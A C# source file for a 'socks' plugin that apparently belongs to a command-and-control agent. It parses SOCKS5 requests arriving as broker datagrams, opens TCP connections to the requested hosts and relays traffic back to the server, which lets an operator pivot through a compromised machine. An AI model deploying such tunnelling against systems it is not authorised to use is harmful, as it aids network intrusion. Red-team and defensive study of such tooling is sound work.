using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;
using System.Collections.Concurrent;
using Nager.TcpClient;

namespace Workflow
{
    public class Plugin : IModule, IProxyModule
    {
        public string Name => "socks";
        private IDataBroker messageManager { get; set; }
        private ILogger logger { get; set; }
        private ConcurrentDictionary<int, TcpClient> connections { get; set; }

        public Plugin(IDataBroker messageManager, IServiceConfig config, ILogger logger, ICredentialProvider tokenManager, IRuntimeExecutor spawner, IScriptEngine pythonManager)
        {
            this.messageManager = messageManager;
            this.logger = logger;
            this.connections = new ConcurrentDictionary<int, TcpClient>();
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
        }
        public async Task HandleDatagram(ServerDatagram sm)
        {
            if (!connections.ContainsKey(sm.server_id) && sm.exit)
            {
                DebugLog.Log($"{Name} exit for unknown server_id={sm.server_id}");
                return;
            }

            if (!connections.TryGetValue(sm.server_id, out var connection))
            {
                DebugLog.Log($"{Name} new connection server_id={sm.server_id}");
                if (!await HandleNewConnection(sm))
                {
                    DebugLog.Log($"{Name} new connection failed server_id={sm.server_id}");
                    ReturnMessageFailure(sm.server_id);
                }
                return;
            }

            if (!string.IsNullOrEmpty(sm.data))
            {
                await connection.SendAsync(Misc.Base64DecodeToByteArray(sm.data));
            }

            if (sm.exit)
            {
                DebugLog.Log($"{Name} closing connection server_id={sm.server_id}");
                if (connections.TryRemove(sm.server_id, out var client))
                {
                    client.Disconnect();
                    client.Dispose();
                }
            }
        }
        private async Task<bool> HandleNewConnection(ServerDatagram sm)
        {
            if (string.IsNullOrEmpty(sm.data))
            {
                return false;
            }

            ConnectionOptions co = new ConnectionOptions(sm); //Begin to parse the packet
            
            if (!await co.ParseAsync())
            {
                ReturnMessageFailure(co.server_id);
                return false;
            }

            var client = new TcpClient(sm.server_id);
            client.DataReceived += OnDataReceived;
            client.Connected += OnConnected;
            client.Disconnected += OnDisconnected;

            return await client.ConnectAsync(co.ip.ToString(), co.port) && connections.TryAdd(client.server_id, client);
        }

        public void ReturnMessageFailure(int id)
        {
            this.messageManager.AddDatagram(
                DatagramSource.Socks5,
                new ServerDatagram(
                    id,
                    new ConnectResponse
                    {
                        bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                        bndport = new byte[] { 0x00, 0x00 },
                        addrtype = (byte)AddressType.IPv4,
                        status = ConnectResponseStatus.GeneralFailure,
                    }.ToByte(),
                    true
                ));
        }
        public void ReturnSuccess(int id)
        {
            ServerDatagram smOut = new ServerDatagram(
             id,
             new ConnectResponse
             {
                 bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                 bndport = new byte[] { 0x00, 0x00 },
                 addrtype = (byte)AddressType.IPv4,
                 status = ConnectResponseStatus.Success,
             }.ToByte(),
             false
            );
            messageManager.AddDatagram(DatagramSource.Socks5, smOut);
        }
        private void OnConnected(int server_id)
        {
            ReturnSuccess(server_id);
        }

        private void OnDataReceived(DataReceivedEventArgs args)
        {
            messageManager.AddDatagram(DatagramSource.Socks5, new ServerDatagram(args.server_id, args.bytes, false));
        }

        private void OnDisconnected(int server_id)
        {
            if (connections.TryRemove(server_id, out var client))
            {
                client.Dispose();
            }
            messageManager.AddDatagram(DatagramSource.Socks5, new ServerDatagram(server_id, new byte[0], true));
        }
    }
}
